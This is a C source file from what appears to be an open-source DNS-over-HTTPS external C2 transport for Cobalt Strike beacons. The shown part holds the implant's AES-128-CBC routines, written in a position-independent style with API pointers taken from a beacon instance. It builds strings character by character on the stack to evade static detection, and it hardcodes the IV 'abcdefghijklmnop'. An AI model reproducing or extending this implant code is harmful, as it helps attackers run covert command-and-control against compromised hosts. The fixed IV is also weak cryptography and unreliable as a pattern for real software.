/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#include "../common.h"

/*-
 *
 * CryptAesInit
 *
 * Purpose:
 *
 * Creates the key object for AES
 *
-*/
DEFINESEC(B) BOOL CryptAesInit( PBEACON_INSTANCE Ins )
{
	UCHAR Str[ MAX_PATH ];
	DWORD Cbc = CRYPT_MODE_CBC;

	Str[0]  = 'M';
	Str[1]  = 'i';
	Str[2]  = 'c';
	Str[3]  = 'r';
	Str[4]  = 'o';
	Str[5]  = 's';
	Str[6]  = 'o';
	Str[7]  = 'f';
	Str[8]  = 't';
	Str[9]  = ' ';
	Str[10] = 'E';
	Str[11] = 'n';
	Str[12] = 'h';
	Str[13] = 'a';
	Str[14] = 'n';
	Str[15] = 'c';
	Str[16] = 'e';
	Str[17] = 'd';
	Str[18] = ' ';
	Str[19] = 'R';
	Str[20] = 'S';
	Str[21] = 'A';
	Str[22] = ' ';
	Str[23] = 'a';
	Str[24] = 'n';
	Str[25] = 'd';
	Str[26] = ' ';
	Str[27] = 'A';
	Str[28] = 'E';
	Str[29] = 'S';
	Str[30] = ' ';
	Str[31] = 'C';
	Str[32] = 'r';
	Str[33] = 'y';
	Str[34] = 'p';
	Str[35] = 't';
	Str[36] = 'o';
	Str[37] = 'g';
	Str[38] = 'r';
	Str[39] = 'a';
	Str[40] = 'p';
	Str[41] = 'h';
	Str[42] = 'i';
	Str[43] = 'c';
	Str[44] = ' ';
	Str[45] = 'P';
	Str[46] = 'r';
	Str[47] = 'o';
	Str[48] = 'v';
	Str[49] = 'i';
	Str[50] = 'd';
	Str[51] = 'e';
	Str[52] = 'r';
	Str[53] = 0x0;

	if ( Ins->api.CryptAcquireContext( &Ins->key[1].Provider, NULL, Str, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_SILENT ) )
	{
		if ( Ins->api.CryptImportKey( Ins->key[1].Provider, Ins->key[1].Ptr, Ins->key[1].Len, 0, 0, &Ins->key[1].Key ) )
		{
			Str[0x0] = 'a';
			Str[0x1] = 'b';
			Str[0x2] = 'c';
			Str[0x3] = 'd';
			Str[0x4] = 'e';
			Str[0x5] = 'f';
			Str[0x6] = 'g';
			Str[0x7] = 'h';
			Str[0x8] = 'i';
			Str[0x9] = 'j';
			Str[0xa] = 'k';
			Str[0xb] = 'l';
			Str[0xc] = 'm'; 
			Str[0xd] = 'n';
			Str[0xe] = 'o';
			Str[0xf] = 'p';

			if ( Ins->api.CryptSetKeyParam( Ins->key[1].Key, KP_IV, Str, 0 ) )
			{
				if ( Ins->api.CryptSetKeyParam( Ins->key[1].Key, KP_MODE, CPTR( &Cbc ), 0 ) )
				{
					return TRUE;
				};
			};
			Ins->api.CryptDestroyKey( Ins->key[1].Key );
		};
		Ins->api.CryptReleaseContext( Ins->key[1].Provider, 0 );
	};
	return FALSE;
};

/*-
 *
 * CryptAesFree
 *
 * Purpose:
 *
 * Free's the associated keys for AES
 *
-*/
DEFINESEC(B) VOID CryptAesFree( PBEACON_INSTANCE Ins )
{
	Ins->api.CryptDestroyKey( Ins->key[1].Key );
	Ins->api.CryptReleaseContext( Ins->key[1].Provider, 0 );
};

/*-
 *
 * CryptAesDecrypt
 *
 * Purpose:
 *
 * Decrypts the buffer using AES-128
 * CBC.
 *
-*/
DEFINESEC(B) BOOL CryptAesDecrypt( PBEACON_INSTANCE Ins, PVOID InOut, ULONG InOutLen )
{
	return Ins->api.CryptDecrypt(
			Ins->key[1].Key,
			0,
			FALSE,
			CRYPT_DECRYPT_RSA_NO_PADDING_CHECK,
			InOut,
			&InOutLen
			);
};
